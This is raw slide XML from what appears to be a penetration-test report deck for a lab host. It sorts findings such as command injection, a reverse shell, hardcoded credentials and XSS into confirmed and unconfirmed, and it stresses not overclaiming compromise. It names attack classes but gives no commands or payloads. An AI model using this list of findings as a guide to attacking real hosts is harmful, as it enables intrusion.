          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3310128"/>
            <a:ext cx="5349240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Service exposure does NOT equal compromise. A reachable port only tells us the service is listening — it says nothing about whether it can actually be accessed.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1463040"/>
            <a:ext cx="5440680" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1600200"/>
            <a:ext cx="4983480" cy="256032"/>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DIRECT CONNECTION ATTEMPT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1920240"/>
            <a:ext cx="4983480" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>“Host '192.168.76.128' is not allowed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>to connect to this MySQL server”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3108960"/>
            <a:ext cx="5440680" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3218688"/>
            <a:ext cx="4983480" cy="256032"/>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CONCLUSION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3493008"/>
            <a:ext cx="4983480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Exposure: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CONFIRMED     </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Database compromise: </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NOT ACHIEVED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4572000"/>
            <a:ext cx="11064240" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6154"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4709160"/>
            <a:ext cx="10515600" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why this matters as a reporting standard</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="5010912"/>
            <a:ext cx="10515600" cy="685800"/>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A weaker report might list “MySQL exposed” as a critical database breach. This one draws the line precisely: the port is reachable, but the server's own access controls actively rejected our connection attempt — that is a Low/Medium exposure finding, not a compromise.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20</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10 · RESULTS</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Confirmed vs. Unconfirmed Results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1234440"/>
            <a:ext cx="10972800" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Professional penetration testing requires knowing what NOT to claim.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1645920"/>
            <a:ext cx="5486400" cy="4709160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1553"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1783080"/>
            <a:ext cx="5029200" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✓  CONFIRMED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2194560"/>
            <a:ext cx="5029200" cy="4023360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Anonymous FTP / information disclosure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Hardcoded credentials (validated via login)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OS command injection / RCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reverse shell as www-data (exploitation impact)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unauthenticated admin/profile access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Reflected XSS (HTTP-level)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Writable SUID binary (misconfiguration)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="900"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>MySQL network exposure</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="1645920"/>
            <a:ext cx="5349240" cy="4709160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1553"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="6B7280"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="1783080"/>
            <a:ext cx="4892040" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B7280"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>✕  NOT CONFIRMED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2194560"/>
            <a:ext cx="4892040" cy="402336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300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SQL injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>LFI / path traversal</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Successful privilege escalation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Root access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Database compromise</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser-executed XSS proof</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21</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11 · SUMMARY</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Complete Attack Chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621792" y="1463040"/>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Network Discovery</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3355848" y="1463040"/>
            <a:ext cx="2697480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="22C55E"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="1463040"/>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Open Ports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6163056" y="1463040"/>
